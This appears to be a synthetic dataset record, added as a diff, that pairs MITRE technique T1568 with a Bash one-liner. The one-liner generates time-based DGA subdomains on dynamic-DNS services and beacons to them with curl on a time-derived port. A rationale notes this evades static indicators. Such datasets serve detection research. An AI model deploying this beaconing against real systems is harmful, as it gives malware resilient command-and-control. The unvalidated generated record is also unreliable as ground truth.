@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "s=$(date -u +%s); h1=$(echo -n \"$s-1\" | sha256sum | cut -c1-12); h2=$(echo -n \"$s-2\" | sha256sum | cut -c1-12); h3=$(echo -n \"$s-3\" | sha256sum | cut -c1-12); port=$(( 20000 + ($s % 20000) )); d1=\"$h1.dynu.net\"; d2=\"$h2.duckdns.org\"; d3=\"$h3.ddns.net\"; curl --connect-timeout 3 \"https://$d1:$port/health\" || curl --connect-timeout 3 \"https://$d2:$port/health\" || curl --connect-timeout 3 \"https://$d3:$port/health\"",
+  "explanation": "Generates three time-based DGA candidates and attempts them in sequence, with a time-derived port, to leverage dynamic resolution and increase resiliency. This is characteristic of T1568.",
+  "rationale_steps": [
+    "Hash time-based seeds into multiple candidate subdomains.",
+    "Compute a port number from the epoch time.",
+    "Attempt curl to the first DGA domain; failover to others.",
+    "Rely on DNS resolution at runtime to avoid static indicators."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-950deaaf",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
